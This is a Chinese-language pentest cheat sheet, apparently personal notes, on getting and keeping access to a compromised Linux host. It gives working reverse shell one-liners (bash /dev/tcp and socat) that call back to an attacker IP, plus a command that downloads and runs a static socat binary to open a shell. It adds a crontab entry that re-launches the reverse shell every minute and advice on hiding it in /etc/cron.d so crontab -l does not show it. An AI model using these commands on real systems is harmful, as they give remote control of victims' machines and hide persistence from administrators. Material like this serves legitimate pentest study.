## reverse shell

[reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

開後門最直覺的作法就是開一個 shell 在受害者機器的某個 port 讓我們可以連進去，但是這樣可能會被防火牆擋住

所以反過來，在受害者機器上開一個 shell 連回我們的機器

!!! tip "reverse shell"
    ```bash
    # target machine
    bash -i >& /dev/tcp/192.168.100.100/9999 0>&1
    ```

    ```bash
    # hacker machine ( 192.168.100.100 )
    socat TCP-LISTEN:9999 -
    ```

??? failure "cannot create /dev/tcp/..."
    `sh` not support this feature, use `bash` instead
    ```bash
    # run the whole command inside bash
    bash -c "bash -i >& /dev/tcp/192.168.100.100/9999 0>&1"
    ```

## better reverse shell

參考這一篇 [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

!!! tip "python psuedo terminal"
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

!!! tip "socat"
    ```bash
    # target machine
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.100.100:9999
    ```

    ```bash
    # hacker machine ( 192.168.100.100 )
    socat file:`tty`,raw,echo=0 tcp-listen:9999
    ```

    ??? info "no socat install"
        如果受害者機器沒有安裝 socat 可以直接用 [socat standalone binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
        ```bash
        # target machine
        wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
        ```

## crontab

[crontab cheatsheet](https://devhints.io/cron)

拿到 shell 之後，可以把後門塞到 crontab 讓他每一段時間就跑一次後門

```bash
# reverse shell every minute
echo '*/1 * * * * bash -c "bash -i &> /dev/tcp/192.168.100.100/9999 0>&1"' | crontab
```

可以用 `crontab -l` 看目前使用者的所有排程

如果有 root 權限也可以考慮塞到 `/etc/cron.d`, `/etc/cron.hourly`, ...，這樣 `crontab -l` 就看不到了

[^1]:
	https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab
[^2]:
	https://ubuntuforums.org/showthread.php?t=1656623
